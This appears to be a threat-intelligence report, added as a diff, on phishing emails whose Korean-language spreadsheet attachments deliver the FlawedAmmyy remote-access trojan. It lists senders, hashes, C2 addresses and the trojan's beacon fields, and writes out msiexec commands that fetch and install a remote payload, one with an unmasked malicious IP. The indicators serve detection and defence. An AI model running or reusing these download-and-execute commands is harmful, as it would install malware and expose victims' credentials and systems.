@@ -1,0 +1,97 @@
+Email #1
+Sender: secretary@onall4s4wd.com
+Subject: 납부서 (translation: Payment slip)
+Attachment name: S28BW-104225601620.xls.zip
+SHA256   fec685b5b7e8eff03b0aa4cda62d68972d616a8c2081c3c0b6069e90fe00bfd1
+SHA1   f587172fbdf2fe1fad41fd84a6720f3b1c1390d3
+MD5   5a4d28ae8f647b2b323d459b4a374ae3
+ 
+Filename:  S28BW-807776034154.xls
+SHA-256   0182f92d0c78df8a78b7359d3132464ab45213568e19f7f1941107a3a436cf83
+SHA-1   d9b17583c15d895ff1be62938aa6bf7785851cda
+MD5   8364f1e42b4467f527e875e4cf20fe8a
+
+The spreadsheet executes the following:
+msiexec.exe RETURN=311 /i http://92.38.135.204/lib2 /q ksw='%TEMP%'
+ 
+Which pulls down:
+Filename: MSI[0-9A-F]{4}.tmp
+SHA-256   da353578a6d78ddcf8df16cf1efe562ac34ff2aa2469ee5bdcc63ef13d6be13d
+SHA-1   bf2447267c9622bfc651cd421aa6fb0faaa823e2
+MD5   285b5bb72802b2ac669974ae6b127597
+Note:  This is FlawedAmmyy
+ 
+Email #2
+Sender: ccaorsi@fhuce.edu.uy:
+ 
+Additional senders reported by others:
+< alecperea@seelivemagic[.]com>
+< gabriel.moreno@cieltelecom[.]com>
+< initiate@paym[.]org>
+< rus@aps-solver[.]com>
+< info@tweekly[.]ir>
+< rolf.skoog@gof[.]nu>
+< reservation.congress@olympik[.]cz>
+< iveta.faltusova@logitax[.]cz>
+ 
+Subject: 한솔제지(주) 발주서 송부 (Google Translated from Korean: Send order sheet from Hansol Paper Co., Ltd.)
+Attachment: 구매오더 4500286249.xls (Google Translated from Korean: Purchase order 4500286249.xls)
+ 
+File Name: 구매오더 4500286249.xls
+MD5: 57f59b1e113dffb36015af3523344ab1
+SHA-1: 4175509f277d89c9c4380332e2d6a05470884f1c
+SHA-256: dccf4808f742270c24b709f8813d02e2d39a645bb852306e9ef5eae0bd52554e
+ 
+The spreadsheet executes the following:
+msiexec.exe RETURN=311 /i hxxp://202.168.154[.]158/lib1 /q ksw='%TEMP%'
+ 
+Which pulls down:
+File Name: MSI[0-9A-F]{4}.tmp
+MD5: d817e7373d286627fb043a23cd152a40
+SHA-1: 748b4486e933b7d55d59071f173179b04fc0689b
+SHA-256: 0c5f5fde856bb277868a9efa11ef9b46214aa11767f560c58d7f1c14d7eebcea
+Note: Flawed Ammyy RAT (aka FlawedAmmyy RAT) Downloader / Updater
+ 
+ 
+Additional OSINT FlawedAmmyy reporting that we haven't seen in our environment:
+File Name: 1.tmp
+MD5: 255b57e1610dbe4e92d53d5d6b1a5f4d
+SHA-1: 92d9a889429b024cfd70aa82c66b9f786b2c7aa2
+SHA-256: 188ddfb31e80a4ce793d96427400100d1ddee32ce6b1a1807838ec25a664395b
+Note: RC4 Encrypted - Flawed Ammyy RAT (aka FlawedAmmyy RAT) Malware
+ 
+The file ( 1.tmp) is downloaded and decrypted on victim's machine, resulting in the following file:
+%ProgramData%\Microsofts Help\wsus.exe
+ 
+File Name: wsus.exe
+https://www.virustotal.com/#/file/99887b4e0afb5047ce68b28ba9d301b3da35e96bcb140e3011baf57d9fe9844a/detection
+MD5: 308c27af334a83ccdcb7d229e8065b53
+SHA-1: 8bd9da0efd088febbbb99bdffde3452fd12d0342
+SHA-256: 99887b4e0afb5047ce68b28ba9d301b3da35e96bcb140e3011baf57d9fe9844a
+SSDeep: 12288:GjPHlyWcqM/K8p5w2hQYAw7aBkH3ewOZa+FSpE0qm+aPaBKAn:a/l+a2hQYvHsuJ+24KAn
+Compile Time: 2019-03-26 13:13:30
+Note: RC4 Decrypted - Flawed Ammyy RAT (aka FlawedAmmyy RAT) Malware
+ 
+ 
+TCP Activity:
+169.239.128[.]111:80
+ 
+In the initial handshake, sent by the client to the server, the first byte is always “=”, followed by 35 obfuscated and SEAL-encrypted bytes. After a server response, the infected client sends the second packet. This packet has a 5-byte header that includes the length of the rest of the packet. The body of this packet contains cleartext key-value pairs:
+id=<8 digit number>&os=<operating_system>&priv=<privilege>&cred=<username>&pcname=<computer_name>&avname=<AV_product_name>&build_time=<malware_build_time>&card=<smart_card_status>&
+
+Whois & IP Information
+ 
+IP Information for 202.168.154[.]158
+IP Location: Korea, Republic Of Seoul Snl Hk
+ASN: AS45382 EHOSTIDC-AS-KR EHOSTICT, KR (registered Aug 19, 2008)
+ 
+IP Information for 92.38.135[.]204
+IP Location: Korea, Republic Of Seoul G-core Labs S.a.
+ASN: AS199524 GCORE, AT (registered Dec 10, 2012)
+Resolve Host: boykovskiyk.example[.]com
+ 
+IP Information for 169.239.128[.]111
+IP Location: South Africa Cape Town Zappie Africa Ltd
+ASN: AS61138 ZAPPIE-HOST-AS Zappie Host, GB (registered Mar 04, 2015)
+Resolve Host: dontclickonme[.]com
+Reverse IP: 1 website uses this address ( dontclickonme[.]com)
